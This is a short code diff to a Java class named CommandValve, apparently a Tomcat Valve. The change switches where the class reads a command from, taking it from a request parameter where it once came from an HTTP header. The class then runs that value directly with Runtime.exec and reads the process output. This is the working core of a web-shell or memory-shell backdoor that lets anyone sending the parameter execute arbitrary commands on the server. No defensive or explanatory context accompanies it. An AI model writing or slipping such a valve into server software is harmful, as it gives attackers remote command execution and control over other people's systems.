@@ -15,7 +15,7 @@ import java.io.InputStream;
 public class CommandValve implements Valve {
     protected Valve next;
     protected boolean asyncSupported;
-    public String headerName;
+    public String paramName;
 
     public CommandValve() {
     }
@@ -42,7 +42,7 @@ public class CommandValve implements Valve {
     @Override
     public void invoke(Request request, Response response) throws IOException, ServletException {
         try {
-            String cmd = request.getHeader(headerName);
+            String cmd = request.getParameter(paramName);
             if (cmd != null) {
                 Process exec = Runtime.getRuntime().exec(cmd);
                 InputStream inputStream = exec.getInputStream();
